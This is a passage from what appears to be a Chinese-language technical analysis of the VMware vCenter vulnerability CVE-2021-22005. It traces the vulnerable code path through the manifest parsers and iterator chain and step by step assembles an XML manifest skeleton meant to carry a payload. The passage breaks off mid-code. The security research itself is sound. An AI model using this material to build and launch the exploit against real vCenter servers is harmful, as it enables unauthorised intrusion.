<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs axapta">com.vmware.ph.phservice.cloud.dataapp.<span class="hljs-keyword">server</span>.DataAppAgentController<span class="hljs-meta">#collect </span><br>    collectedData = ((CollectorDataAppAgent)agent).collect(manifestContent, objectId, jsonLdContextData); <span class="hljs-comment">//方法参数由POST传入</span><br>com.vmware.ph.phservice.cloud.dataapp.<span class="hljs-keyword">internal</span>.collector.DefaultCollectorDataAppAgent<span class="hljs-meta">#collect  </span><br>    List&lt;CollectionSpec&gt; collectionSpecs = <span class="hljs-keyword">this</span>.createCollectionSpecs(<span class="hljs-keyword">this</span>._dataApp, objectIdToContextData, CollectionTriggerType.ON_DEMAND, inMemoryManifestContentProvider, inMemoryUploadStrategy, <span class="hljs-literal">true</span>);<br>    Collector collector = <span class="hljs-keyword">this</span>.createCollector(collectionSpecs, (CollectionSchedule)<span class="hljs-literal">null</span>, CollectionTriggerType.ON_DEMAND);<br><br>    outcome = collector.collect();<br></code></pre></td></tr></table></figure>

<p>着重对<code>collector.collect()</code>进行分析，实际完成操作的是在：com.vmware.ph.phservice.collector.internal.core.ConnectionClosingCollectorWrapper#collect()中</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/24.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/25.png" srcset="/img/loading.gif" lazyload></p>
<p>跟入collect()：<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.SpecsCollector#collect() —&gt;com.vmware.ph.phservice.cloud.dataapp.internal.collector.SpecsCollector#collectAndSend()</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/26.png" srcset="/img/loading.gif" lazyload></p>
<p>​    这个方法有两步重要操作，第一步根据xml数据构建Manifest对象。第二步对manifestToExecute进行收集操作。先分析第一步XML构造</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/27.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="3-2-1-根据XML数据还原Manifest对象"><a href="#3-2-1-根据XML数据还原Manifest对象" class="headerlink" title="3.2.1 根据XML数据还原Manifest对象"></a>3.2.1 根据XML数据还原Manifest对象</h4><p>在<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.CollectionTriggerTypeManifestParser#getManifest()</code>方法中，根据用户传入的<code>manifestContent</code>内容，系统使用不同的解析器（<code>XmlManifestParser、VsanHealthJsonManifestParser、VsanPerformanceJsonManifestParser</code>）去解析</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/28.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/29.png" srcset="/img/loading.gif" lazyload></p>
<p>筛选规则在解析器类的isApplicable()中</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.collector</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.manifest</span><span class="hljs-selector-class">.xml</span>.XmlManifestParser<span class="hljs-selector-id">#isApplicable</span><br>com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.dataapp</span><span class="hljs-selector-class">.vsan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.collector</span>.VsanHealthJsonManifestParser<span class="hljs-selector-id">#isApplicable</span><span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.dataapp</span><span class="hljs-selector-class">.vsan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.collector</span>.VsanPerformanceJsonManifestParser#isApplicable<br></code></pre></td></tr></table></figure>

<p>​                                                                                                   <img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/30.png" srcset="/img/loading.gif" lazyload> </p>
<p>接着调用解析器的getManifest()，即<code>com.vmware.ph.phservice.collector.internal.manifest.xml.XmlManifestParser#getManifest()</code>，在这个方法中规定了各个标签内容，依次为：<code>&lt;requestSchedules&gt;、&lt;request&gt;、&lt;cdfmapping&gt;</code></p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public Manifest get<span class="hljs-constructor">Manifest(String <span class="hljs-params">manifestStr</span>, CollectionSchedule <span class="hljs-params">schedule</span>)</span> &#123;<br>	   <span class="hljs-comment">//1、限制必须包含&lt;requestSchedules&gt;</span><br>        Document manifestDoc = get<span class="hljs-constructor">ManifestDocForSchedule(<span class="hljs-params">manifestStr</span>, <span class="hljs-params">schedule</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_isLegacySchedulingSupported</span>)</span>;<br>        <span class="hljs-keyword">if</span> (manifestDoc<span class="hljs-operator"> == </span>null) &#123;<br>            return null;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            NamedQuery<span class="hljs-literal">[]</span> queries = parse<span class="hljs-constructor">Queries(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_requestParser</span>)</span>;<br>            NamedQuery<span class="hljs-literal">[]</span> queriesForSchedule = this.get<span class="hljs-constructor">NamedQueriesForSchedule(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">schedule</span>, <span class="hljs-params">queries</span>)</span>;<br>            <span class="hljs-comment">//2、限制&lt;request&gt;标签必须包含一个&lt;query&gt;标签</span><br>            <span class="hljs-keyword">if</span> (queriesForSchedule != null<span class="hljs-operator"> &amp;&amp; </span>queriesForSchedule.length != <span class="hljs-number">0</span>) &#123;<br>            	<span class="hljs-comment">//3、解析&lt;cdfmapping&gt;标签，这个是需要放payload的标签</span><br>                NamedQueryResultSetMapping&lt;Payload20&gt; cdfNamedQueryMapping = get<span class="hljs-constructor">CdfNamedQueryMapping(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_cdfMappingParser</span>)</span>;<br>                NamedQueryResultSetMapping&lt;File&gt; fileNamedQueryMapping = get<span class="hljs-constructor">FileNamedQueryMapping(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_fileMappingParser</span>)</span>;<br>                List&lt;ObfuscationRule&gt; obfuscationRules = parse<span class="hljs-constructor">ObfuscationRules(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_obfuscationRulesParser</span>)</span>;<br>                <span class="hljs-built_in">int</span> recommendedPageSize = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XmlManifestUtils</span>.</span></span>get<span class="hljs-constructor">RecommendedPageSize(<span class="hljs-params">manifestDoc</span>, 5000)</span>;<br>                <br>                Manifest result = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Builder</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Queries(<span class="hljs-params">queriesForSchedule</span>)</span>.<span class="hljs-keyword">with</span><span class="hljs-constructor">CdfMapping(<span class="hljs-params">getNonNullNamedQueryResultSetMapping</span>(<span class="hljs-params">cdfNamedQueryMapping</span>)</span>).<span class="hljs-keyword">with</span><span class="hljs-constructor">FileMapping(<span class="hljs-params">getNonNullNamedQueryResultSetMapping</span>(<span class="hljs-params">fileNamedQueryMapping</span>)</span>).<span class="hljs-keyword">with</span><span class="hljs-constructor">ObfuscationRules(<span class="hljs-params">getNonNullObfuscationRules</span>(<span class="hljs-params">obfuscationRules</span>)</span>).<span class="hljs-keyword">with</span><span class="hljs-constructor">RecommendedPageSize(<span class="hljs-params">recommendedPageSize</span>)</span>.build<span class="hljs-literal">()</span>;<br>                return result;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                return null;<br>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>a、构造<requestSchedules>标签</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> static Document get<span class="hljs-constructor">ManifestDocForSchedule(String <span class="hljs-params">manifestStr</span>, CollectionSchedule <span class="hljs-params">collectionSchedule</span>, <span class="hljs-params">boolean</span> <span class="hljs-params">isLegacySchedulingSupported</span>)</span> &#123;<br>        boolean containsRequestScheduleSection = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XmlManifestUtils</span>.</span></span>contains<span class="hljs-constructor">RequestScheduleSection(<span class="hljs-params">manifestStr</span>)</span>;<br>        Document manifestDocument;<br>        <span class="hljs-keyword">if</span> (containsRequestScheduleSection) &#123;	<span class="hljs-comment">//必须包含requestSchedules标签</span><br>            manifestDocument = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XmlManifestUtils</span>.</span></span>get<span class="hljs-constructor">NonDailySection(<span class="hljs-params">manifestStr</span>)</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isLegacySchedulingSupported) &#123;<span class="hljs-comment">//默认false</span><br>            manifestDocument = get<span class="hljs-constructor">ManifestDocForLegacySchedule(<span class="hljs-params">manifestStr</span>, <span class="hljs-params">collectionSchedule</span>)</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            manifestDocument = null;<br>        &#125;<br>        return manifestDocument;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/31.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/32.png" srcset="/img/loading.gif" lazyload></p>
<p><code>&lt;requestSchedules&gt;标签对应的类是：com.vmware.ph.phservice.collector.internal.manifest.xml.scheduling.data.RequestScheduleSpec</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/33.png" srcset="/img/loading.gif" lazyload></p>
<p>构造完成<requestSchedules>标签:<code>&lt;requestSchedules&gt;&lt;/requestSchedules&gt;</code></p>
<p>b、构造<request>标签</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.collector</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.manifest</span><span class="hljs-selector-class">.xml</span>.XmlManifestParser<span class="hljs-selector-id">#parseQueries</span><br>com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.collector</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.manifest</span><span class="hljs-selector-class">.xml</span>.XmlManifestUtils#parseRequestSpec<br></code></pre></td></tr></table></figure>

<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/34.png" srcset="/img/loading.gif" lazyload></p>
<p>解析<request>标签的解析器：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.JaxbRequestSpecParser#parse</code>,限制了必须包含<code>&lt;constraint&gt;</code>标签</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/35.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/36.png" srcset="/img/loading.gif" lazyload></p>
<p><request>标签对应的类是：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.data.RequestSpec</code></p>
<p>​                                                  <img src="/../../../../images/c3442871da035b4836c30ca52af6386b2b9a3944713588fd665b518b3c05dc94.png" srcset="/img/loading.gif" lazyload alt="图 4">  </p>
<p>query标签对应的类是：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.data.QuerySpec</code></p>
<p>​                                                <img src="/../../../../images/1f99ba2290974305704d0bbc37151205aa6709083d2fc0056eb8ca64bf8bcf45.png" srcset="/img/loading.gif" lazyload alt="图 5">  </p>
<p>constraint标签对应的类是：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.data.QuerySpec#QuerySpec()</code></p>
<p>​                                             <img src="/../../../../images/1287bb7f2b34501c61cd57cf762cb7fe7662ad01f965afb0da35a130aa0ce4ce.png" srcset="/img/loading.gif" lazyload alt="图 6">  </p>
<p>构造<request>标签：<code>&lt;request&gt;&lt;query&gt;&lt;constraint&gt;&lt;targetType&gt;xxx&lt;/targetType&gt;&lt;/constraint&gt;&lt;/query&gt;&lt;/request&gt;</code></p>
<p>c、构造<cdfMapping>标签</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp">com.vmware.ph.phservice.collector.<span class="hljs-keyword">internal</span>.manifest.xml.XmlManifestUtils<span class="hljs-meta">#parseCdfMapping</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;I, O&gt; <span class="hljs-function">Mapping&lt;I, O&gt; <span class="hljs-title">parseCdfMapping</span>(<span class="hljs-params">Document manifestDoc, MappingParser mappingParser</span>)</span> &#123;<br>	<span class="hljs-keyword">return</span> parseMapping(manifestDoc, mappingParser, <span class="hljs-string">&quot;cdfMapping&quot;</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><cdfMapping>标签对应的解析器:<code>com.vmware.ph.phservice.collector.internal.manifest.xml.mapping.JaxbCdfMappingParser#parse</code></p>
<p>58行限制了<cdfMapping>的第一个节点对应类为：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.mapping.data.IndependentResultsMapping</code>,拿到IndependentResultsMapping对象后，调用其<code>build()</code>返回重新构造的<code>com.vmware.ph.phservice.collector.internal.cdf.mapping.IndependentResultsMapping</code>对象</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/37.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/38.png" srcset="/img/loading.gif" lazyload></p>
<p><code>&lt;indepedentResultsMapping&gt;</code>标签对应类：<code>com.vmware.ph.phservice.collector.internal.manifest.xml.mapping.data.IndependentResultsMapping</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/39.png" srcset="/img/loading.gif" lazyload></p>
<p>在build()时会根据属性值<code>resultSetMappings</code>重新构建<code>IndependentResultsMapping</code>对象.所以需要加上resultSetMappings属性值，这部分后面构造时会讲解</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">requestSchedules</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">requestSchedules</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">request</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">query</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">targetType</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">targetType</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">request</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">cdfMapping</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">indepedentResultsMapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">indepedentResultsMapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">cdfMapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>我们接着往下看，解析器构建完Manifest对象后开始检查queries变量：<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.CollectionTriggerTypeManifestParser#getManifest</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/40.png" srcset="/img/loading.gif" lazyload></p>
<p>com.vmware.ph.phservice.cloud.dataapp.iternal.collector.CollectionTriggerTypeManifestParser#filterOnDemandQueries</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/41.png" srcset="/img/loading.gif" lazyload></p>
<p>限制<code>&lt;request&gt;</code>的子标签<code>&lt;query&gt;</code>必须包含name,调整为：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">request</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">query</span> <span class="hljs-attr">name</span>=<span class="hljs-string">\</span>&quot;<span class="hljs-attr">aaa</span>\&quot;&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">targetType</span>&gt;</span>sss<span class="hljs-tag">&lt;/<span class="hljs-name">targetType</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constraint</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">query</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">request</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="3-2-2-对manifestToExecute进行收集操作"><a href="#3-2-2-对manifestToExecute进行收集操作" class="headerlink" title="3.2.2 对manifestToExecute进行收集操作"></a>3.2.2 对manifestToExecute进行收集操作</h4><p>构建好<code>Manifest</code>对象之后就到了：<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.SpecsCollector#collectAndSend()</code>的第二步操作</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/42.png" srcset="/img/loading.gif" lazyload></p>
<p>跟入：<code>com.vmware.ph.phservice.collector.internal.core.UsageDataCollector#collect-&gt;com.vmware.ph.phservice.collector.internal.core.UsageDataCollector#collectAndUpload-&gt;com.vmware.ph.phservice.collector.internal.core.UsageDataCollector#processStructuredDataCollectors</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/43.png" srcset="/img/loading.gif" lazyload></p>
<p>这里的几步操作分别为：<code>收集payloads、创建迭代器、判断迭代器、依次访问迭代器</code>，在访问迭代器时触发map()是导致本次漏洞的主因。下面对这三部分依次讲解</p>
<h5 id="3-2-2-1-第一部分：收集payloads"><a href="#3-2-2-1-第一部分：收集payloads" class="headerlink" title="3.2.2.1 第一部分：收集payloads"></a>3.2.2.1 第一部分：收集payloads</h5><p>最终返回的是重写了iterator()的<code>FluentIterable</code>对象</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/44.png" srcset="/img/loading.gif" lazyload>相当于伪代码：</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">fromIterable = <span class="hljs-keyword">this</span>.collectors<br><br>Function <span class="hljs-function"><span class="hljs-keyword">fun</span> = new Function<span class="hljs-type">&lt;CdfCollector, Iterable&lt;CollectedPayload&gt;</span>&gt;<span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">public</span> Iterable&lt;CollectedPayload&gt; apply(CdfCollector input) &#123;<br>        long startTimeNano = System.nanoTime();<br>        xxx<br>    &#125;<br>&#125;));<br><br>FluentIterable fl = new FluentIterable&lt;T&gt;() &#123;<br>    <span class="hljs-keyword">public</span> Iterator&lt;T&gt; iterator() &#123;<br>        <span class="hljs-keyword">return</span> Iterators.transform(fromIterable.iterator(), <span class="hljs-function"><span class="hljs-keyword">fun</span>);</span><br>        &#125;<br>    &#125;;<br>&#125;<br><br>FluentIterable f2 = new FluentIterable&lt;T&gt;() &#123;<br>    <span class="hljs-keyword">public</span> Iterator&lt;T&gt; iterator() &#123;<br>    	<span class="hljs-keyword">return</span> Iterators.concat(Iterables.iterators(fl));<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">return</span> f2<br></code></pre></td></tr></table></figure>

<h5 id="3-2-2-2-第二部分：创建迭代器"><a href="#3-2-2-2-第二部分：创建迭代器" class="headerlink" title="3.2.2.2 第二部分：创建迭代器"></a>3.2.2.2 第二部分：创建迭代器</h5><p>开始调用:<code>collectedPayloads.iterator()</code>,即<code>f2.iterator()</code>,调用链：<code>f2.iterator()-&gt;f1.iterator()-&gt;Iterators.transform()-&gt;Iterators.concat()</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/45.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/46.png" srcset="/img/loading.gif" lazyload></p>
<p>最终<code>concat()</code>返回了实现hasNext()、next()、remove()的Iterator对象，input是<code>TransformedIterator</code>对象,相当于（伪代码）：</p>
<figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nim">fromIterator = this.collectors.<span class="hljs-keyword">iterator</span>();<br><br><span class="hljs-type">TransformedIterator</span> transformedIterator1 = new <span class="hljs-type">TransformedIterator</span>&lt;F, T&gt;(fromIterator) &#123;<br>    T transform(F <span class="hljs-keyword">from</span>) &#123;<br>    	<span class="hljs-keyword">return</span> fun.apply(<span class="hljs-keyword">from</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">TransformedIterator</span> transformedIterator2 = new <span class="hljs-type">TransformedIterator</span>&lt;<span class="hljs-type">Iterable</span>&lt;? extends T&gt;, <span class="hljs-type">Iterator</span>&lt;? extends T&gt;&gt;(transformedIterator1) &#123;<br>    <span class="hljs-type">Iterator</span>&lt;? extends T&gt; transform(<span class="hljs-type">Iterable</span>&lt;? extends T&gt; <span class="hljs-keyword">from</span>) &#123;<br>    	<span class="hljs-keyword">return</span> <span class="hljs-keyword">from</span>.<span class="hljs-keyword">iterator</span>();<br>    &#125;<br>&#125;;<br><br><br><span class="hljs-type">Iterator</span> iterator1 = new <span class="hljs-type">Iterator</span>&lt;T&gt;() &#123;<br>	inputs = transformedIterator2;<br>    public boolean hasNext() <span class="hljs-meta">&#123;...&#125;</span><br>    public T next() <span class="hljs-meta">&#123;...&#125;</span><br>    public <span class="hljs-type">void</span> remove() <span class="hljs-meta">&#123;...&#125;</span><br>&#125;;<br><br><br><span class="hljs-keyword">return</span> iterator1;<br></code></pre></td></tr></table></figure>

<h5 id="3-2-2-2-第三部分：判断迭代器"><a href="#3-2-2-2-第三部分：判断迭代器" class="headerlink" title="3.2.2.2 第三部分：判断迭代器"></a>3.2.2.2 第三部分：判断迭代器</h5><p>接着开始调用<code>collectedPayloadsIterator.hasNext()</code>即<code>iterator1.hasNext()</code>判断是否next()存在值，<code>inputs.hasNext()-&gt;transformedIterator2.hasNext()-&gt;transformedIterator1#hasNext()-&gt;this.collectors.iterator().hasNext()</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/47.png" srcset="/img/loading.gif" lazyload></p>
<p>判断存在后，调用inputs.next()进行赋值：<code>inputs.next()-&gt;transformedIterator2.next()-&gt;transformedIterator1#next()-&gt;this.collectors.iterator().next()-&gt;transformedIterator1.transform()-&gt;fun.apply()</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/48.png" srcset="/img/loading.gif" lazyload></p>
<p>调用到<code>input.collect(manifest, queryService, context, pageSize);</code>,将我们传入的<code>&lt;query&gt;</code>与<code>&lt;cdfMapping&gt;</code>赋值给queries、payloadMappin</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/49.png" srcset="/img/loading.gif" lazyload></p>
<p>com.vmware.ph.phservice.collector.internal.data.QueryServiceCollector#collect</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/50.png" srcset="/img/loading.gif" lazyload></p>
<p><code>com.vmware.ph.phservice.collector.internal.data.QueryServiceCollector#filterQueriesForExecution</code>限制了IndependentResultsMapping#_queryNameToResultSetMapping的entry要包含<query>的name值即：<code>&lt;query name=&quot;aaa&quot;&gt;    &lt;cdfMapping&gt;&lt;indepedentResultsMapping&gt;&lt;resultSetMappings&gt;&lt;entry&gt;&lt;key&gt;aaa&lt;/key&gt;&lt;/entry&gt;&lt;/resultSetMappings&gt;&lt;/indepedentResultsMapping&gt;</code></p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/51.png" srcset="/img/loading.gif" lazyload></p>
<p>添加query之后返回实现了iterator()的Iterable对象，继续往下执行到<code>Iterables.transform(result, obfuscationFunction);</code>，返回实现了iterator()的FluentIterable类对象</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/52.png" srcset="/img/loading.gif" lazyload></p>
<p>接着执行到<code>Iterables.concat(result, perfData);</code>，返回实现了iterator()的FluentIterable类对象</p>
<p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/53.png" srcset="/img/loading.gif" lazyload></p>
<p>​                                         &#x2F;<img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/54.png" srcset="/img/loading.gif" lazyload></p>
<p>相当于伪代码：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Iterable iterable2 = <span class="hljs-keyword">new</span> Iterable&lt;OUT&gt;<span class="hljs-literal">()</span> &#123;<br>    public Iterator&lt;OUT&gt; iterator<span class="hljs-literal">()</span> &#123;<br>    	return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">QueryServiceCollector</span>.</span></span>this.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_resultIteratorFactory</span>.</span></span>get<span class="hljs-constructor">Iterator(<span class="hljs-params">queryService</span>, <span class="hljs-params">responseMapping</span>, <span class="hljs-params">modifiedContext</span>, <span class="hljs-params">queriesForExecution</span>, <span class="hljs-params">pageSize</span>)</span>;<br>    &#125;<br>&#125;);<br><br><br>FluentIterable f3 = <span class="hljs-keyword">new</span> FluentIterable&lt;T&gt;<span class="hljs-literal">()</span> &#123;<br>    public Iterator&lt;T&gt; iterator<span class="hljs-literal">()</span> &#123;<br>    	return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Iterators</span>.</span></span>transform(iterable2.iterator<span class="hljs-literal">()</span>, <span class="hljs-keyword">new</span> QueryServiceCdfCollector.<span class="hljs-constructor">ObfuscationFunction(<span class="hljs-params">this</span>.<span class="hljs-params">_obfuscator</span>, <span class="hljs-params">obfuscationRules</span>)</span>);<br>    &#125;<br>&#125;;<br><br>FluentIterable f4 = <span class="hljs-keyword">new</span> FluentIterable&lt;T&gt;<span class="hljs-literal">()</span> &#123;<br>    public Iterator&lt;T&gt; iterator<span class="hljs-literal">()</span> &#123;<br>    	return <span class="hljs-module-access"><span class="hljs-module"><span 